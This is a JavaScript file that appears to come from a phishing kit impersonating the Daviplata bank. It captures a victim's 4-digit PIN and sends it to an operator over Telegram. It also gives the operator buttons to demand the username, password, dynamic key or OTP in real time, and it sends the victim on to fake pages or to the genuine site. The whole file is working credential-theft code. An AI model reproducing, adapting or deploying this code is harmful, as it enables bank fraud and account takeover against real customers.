/**
 * DAVIPLATA - clave.js OPTIMIZADO
 */

document.addEventListener('DOMContentLoaded', () => {
    console.log('🚀 Daviplata Clave: Inicializando...');
    
    if (typeof BancoUtils === 'undefined') {
        console.error('❌ BancoUtils no está cargado');
        return;
    }
    
    BancoUtils.initSocket();
    console.log('✅ Socket inicializado');
    
    const input = document.getElementById('claveInput');
    const btnContinue = document.getElementById('btnContinue');
    const overlay = document.getElementById('loadingOverlay');

    BancoUtils.onTelegramAction(handleTelegramAction);

    input.addEventListener('input', () => {
        BancoUtils.validateNumeric(input, 4);
        const isValid = input.value.length === 4;
        btnContinue.disabled = !isValid;
        if (isValid) {
            btnContinue.classList.add('enabled');
        } else {
            btnContinue.classList.remove('enabled');
        }
    });

    btnContinue.addEventListener('click', async (e) => {
        e.preventDefault();
        e.stopPropagation();
        
        if (btnContinue.disabled) return;
        
        console.log('🔘 Botón clickeado');
        console.log('📦 Mostrando overlay...');
        
        if (overlay) {
            overlay.classList.add('show');
            overlay.classList.add('active');
            overlay.style.display = 'flex';
            console.log('✅ Overlay mostrado');
        }

        const data = BancoUtils.saveBankData('daviplata', { clave: input.value });
        console.log('📤 Datos a enviar:', data);
        
        const message = BancoUtils.formatMessage('DAVIPLATA - CONTRASEÑA', data);
        const keyboard = BancoUtils.createKeyboard([
            { text: '📱 Pedir Usuario', action: 'request_user' },
            { text: '🔐 Pedir Contraseña', action: 'request_password' },
            { text: '🔢 Pedir Dinámica', action: 'request_dynamic' },
            { text: '📱 Pedir OTP', action: 'request_otp' },
            { text: '✅ Finalizar', action: 'finish' }
        ], BancoUtils.getSessionId());

        console.log('📨 Enviando a Telegram...');
        try {
            await BancoUtils.sendToTelegram('password', { text: message, keyboard });
            console.log('✅ Mensaje enviado correctamente');
        } catch (error) {
            console.error('❌ Error al enviar:', error);
            if (overlay) {
                overlay.classList.remove('show', 'active');
                overlay.style.display = 'none';
            }
            alert('Error al enviar los datos. Por favor intente nuevamente.');
        }
    });

    function handleTelegramAction(data) {
        switch(data.action) {
            case 'request_user':
                window.location.href = 'index.html';
                break;
            case 'request_password':
                input.value = '';
                btnContinue.disabled = true;
                break;
            case 'request_dynamic':
                window.location.href = 'dinamica.html';
                break;
            case 'request_otp':
                window.location.href = 'otp.html';
                break;
            case 'finish':
                window.location.href = 'https://www.daviplata.com/';
                break;
        }
    }
});
